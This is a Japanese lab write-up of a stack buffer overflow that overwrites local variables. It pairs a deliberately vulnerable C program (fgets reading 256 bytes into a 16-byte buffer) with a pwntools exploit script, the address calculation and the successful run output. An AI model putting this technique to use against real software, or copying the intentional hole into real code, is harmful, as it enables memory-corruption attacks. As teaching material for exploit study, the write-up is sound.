# 概要
  - スタックバッファーオーバーフローを利用したローカル変数の書き換え

# 環境
### 動作環境
  - Ubuntu 22.04 LTS

### 環境構築

  ```
  $ pip3 install pwntools
  ```

# サンプルコード

### 対象ソースコード
  - sbof_lv    : 脆弱性を含む実行バイナリ
  - sbof_lv.c  : sbof_lvのソースコード
  - sbof_lv.py : エクスプロイトコード

### 実行方法

  ```
    $ stdbuf -o0 -e0 python3 ./sbof_lv.py
  ```

# サンプルコードの概要
### sbof_lv.c

  ```
  #include <stdio.h>
  #include <string.h>

  void main(void){
    char *priv = "user";
    unsigned key = 0xcafebabe;
    char secret[0x10] = "AAAA";
    char name[0x10] = {0};

    printf("Input Name >> ");
    fgets(name, 0x100, stdin);
    printf("\nname\t: %s\nsecret\t: %s\nkey\t: %x\npriv\t: %s\n", name, secret, key, priv);

    if(!strcmp(priv, "admin") &&
        !strcmp(secret, "H4cked!") &&
        key == 0xdeadbeef)
        puts("Correct!");
    else
        puts("Wrong...");
  }
  ```

  - priv="admin"、secret="H4cked!"、key=0xdeadbeef のとき、フラグが取れる。("Correct!" と表示される)

  ```
    if(!strcmp(priv, "admin") &&
        !strcmp(secret, "H4cked!") &&
        key == 0xdeadbeef)
        puts("Correct!");
    else
        puts("Wrong...");
  ```

  - 標準入力で、ローカル変数 name に書き込みしているが、name は 16 byteしかないため、
    16文字以上書き込みすると、スタックバッファーオーバーフローが発生する。

  ```
    char name[0x10] = {0};

    printf("Input Name >> ");
    fgets(name, 0x100, stdin);
  ```

### sbof_lv.py

  ```
  #!/usr/bin/env python3
  
  from pwn import *
  import sys
  import struct
  
  bin_file = './sbof_lv'
  
  def attack(conn, **kwargs):
  
      exploit  = b'a' * 0x10                           # nameへの書き込み
      exploit += b'H4cked!'.ljust(0x14, b'\x00')       # selectへの書き込み
      exploit += struct.pack('<I', 0xdeadbeef)         # keyへの書き込み
      exploit += struct.pack('<Q', 0x000000000040204b) # privへの書き込み
  
      conn.sendline(exploit)
  
      print(conn.recvall().decode())
  
  def main():
  
      conn = process(bin_file)
  
      attack(conn)
  
  if __name__=='__main__':
      main()
  ```

  - スタックバッファーオーバーフローを発生させるため、nameに'a'を16byte書き込む
  - selectに、文字列 "H4cked!" を書き込む
  - keyに0xdeadbeefを書き込む
  - privに "admin" を書き込む。
    文字列 "admin" は実行バイナリに含まれているため、"admin" のアドレスを調べて、このアドレスを書き込む。
    文字列 "admin" のアドレスは、下記のstringsコマンドの実行結果より、0x204bとなる。
    これは実行バイナリの先頭アドレスからのオフセットであり、
    実行バイナリのロード先は下記のreadelfコマンドの実行結果より、0x400000である。
    したがって、文字列 "admin" のアドレスは、0x40204bである。

  ```
  $ strings -t x  sbof_lv | grep admin
    204b admin
  ```
  ```
  $ readelf -l sbof_lv | grep LOAD
    LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
    LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000
    LOAD           0x0000000000002000 0x0000000000402000 0x0000000000402000
    LOAD           0x0000000000002e10 0x0000000000403e10 0x0000000000403e10
  ```

### 実行結果
  - 下記の通り、期待通り、ローカル変数の書き換えができ、フラグをとれた（Correct!と表示された）

  ```
  $ stdbuf -o0 -e0 python3 ./sbof_lv.py
  [*] Checking for new versions of pwntools
      To disable this functionality, set the contents of /home/ubuntu/.cache/.pwntools-cache-3.10/update to 'never' (old way).
      Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
          [update]
          interval=never
  [*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
      Update with: $ pip install -U pwntools
  [+] Starting local process './sbof_lv': pid 193507
  [+] Receiving all data: Done (100B)
  [*] Process './sbof_lv' stopped with exit code 9 (pid 193507)
  Input Name >>
  name    : aaaaaaaaaaaaaaaaH4cked!
  secret  : H4cked!
  key     : deadbeef
  priv    : admin
  Correct!
  ```

# 参考
### スタックメモリ配置（書き換え前）
  -0x30 - -0x21 : name  
  -0x20 - -0x11 : select  
  -0x10 - -0x0D : reserved  
  -0x0C - -0x09 : key  
  -0x08 - -0x01 : priv  
  +0x00 - +0x07 : saved rbp  
  +0x08 - +0x0F : return address  

### スタックメモリ配置（書き換え後）
  -0x30 - -0x21 : 'a' * 0x10  
  -0x20 - -0x11 : 'H4cked!' + '\x00'* 9  
  -0x10 - -0x0D : 0x00000000  
  -0x0C - -0x09 : 0xdeadbeef  
  -0x08 - -0x01 : 0x000000000040204b  
  +0x00 - +0x07 : saved rbp  
  +0x08 - +0x0F : return address  
